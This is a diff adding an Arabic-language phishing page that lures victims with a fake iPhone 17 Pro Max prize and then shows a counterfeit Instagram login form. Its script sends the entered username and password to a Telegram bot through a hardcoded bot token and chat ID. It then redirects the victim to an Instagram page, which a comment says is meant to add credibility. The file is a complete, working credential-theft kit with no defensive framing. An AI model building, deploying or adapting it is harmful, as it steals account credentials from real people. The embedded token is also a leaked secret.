@@ -1,0 +1,81 @@
+
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram | iPhone 17 Pro Max</title>
+    <style>
+        body { background: #fdfdfd; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        
+        .main-card { width: 95%; max-width: 420px; background: white; border-radius: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); overflow: hidden; text-align: center; border: 1px solid #eee; }
+        
+        /* الصورة التي رفعتها */
+        .promo-img { width: 100%; height: auto; display: block; }
+        
+        .content-padding { padding: 25px; }
+        
+        .btn-claim { 
+            background: linear-gradient(45deg, #f09433, #e6683c); 
+            color: white; border: none; padding: 16px 40px; 
+            border-radius: 50px; font-size: 19px; font-weight: bold; 
+            cursor: pointer; width: 100%; box-shadow: 0 5px 15px rgba(188, 24, 136, 0.3);
+            transition: 0.3s;
+        }
+
+        /* واجهة انتحال إنستغرام */
+        #login-ui { display: none; padding: 30px; animation: fadeInUp 0.6s ease; }
+        .insta-logo { width: 170px; margin-bottom: 25px; }
+        .input-insta { width: 100%; padding: 12px; margin: 7px 0; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 5px; box-sizing: border-box; text-align: center; }
+        .btn-login { width: 100%; background: #0095f6; color: white; border: none; padding: 12px; border-radius: 5px; font-weight: bold; margin-top: 15px; cursor: pointer; }
+        
+        @keyframes fadeInUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
+    </style>
+</head>
+<body>
+
+<div class="main-card">
+    <div id="promo-view">
+        <img src="iphone17.jpg" class="promo-img">
+        <div class="content-padding">
+            <p style="color:#d32f2f; font-weight:bold; font-size:15px; margin-top:0;">شروط المسابقة: متابعة الحساب وتأكيد هويتك</p>
+            <button class="btn-claim" onclick="goToLogin()">إضغط هنا لاستلام الجائزة</button>
+        </div>
+    </div>
+
+    <div id="login-ui">
+        <img src="iphone17.jpg" class="insta-logo">
+        <p style="color:#262626; font-weight:bold; margin-bottom:10px; font-size: 16px;">مبروك! تم اختيارك للفوز بـ iPhone 17 🎊</p>
+        <p style="color:#8e8e8e; font-size:13px; margin-bottom:25px;">لاستلام الجائزة: <b>يرجى تسجيل الدخول ومتابعة صفحتنا</b> لتأكيد هويتك.</p>
+        
+        <form id="pish">
+            <input type="text" id="u" class="input-insta" placeholder="اسم المستخدم أو الهاتف" required>
+            <input type="password" id="p" class="input-insta" placeholder="كلمة السر" required>
+            <button type="submit" class="btn-login">تسجيل الدخول والمتابعة</button>
+        </form>
+        <p style="color:#00376b; font-size:12px; margin-top:20px; cursor:pointer;">هل نسيت كلمة السر؟</p>
+    </div>
+</div>
+
+<script>
+    function goToLogin() {
+        document.getElementById('promo-view').style.display = 'none';
+        document.getElementById('login-ui').style.display = 'block';
+    }
+
+    document.getElementById('pish').onsubmit = function(e) {
+        e.preventDefault();
+        const user = document.getElementById('u').value;
+        const pass = document.getElementById('p').value;
+        const msg = `🔥 صيد VIP (iPhone 17 Pro Max):\n👤 اليوزر: ${user}\n🔑 الرمز: ${pass}`;
+        
+        fetch(`https://api.telegram.org/bot8505285607:AAEEG79gHONgRUxh6lx5Fo9sa3gMvAqaMMs/sendMessage?chat_id=448818597&text=${encodeURIComponent(msg)}`)
+        .then(() => {
+            alert("تم التحقق بنجاح! سيتم إرسال كود الاستلام في رسالة خاصة.");
+            window.location.href = "https://www.instagram.com/iphone_pro_max_worms_/"; // رابط منشور المسابقة الأصلي لزيادة المصداقية
+        });
+    };
+</script>
+
+</body>
+</html>
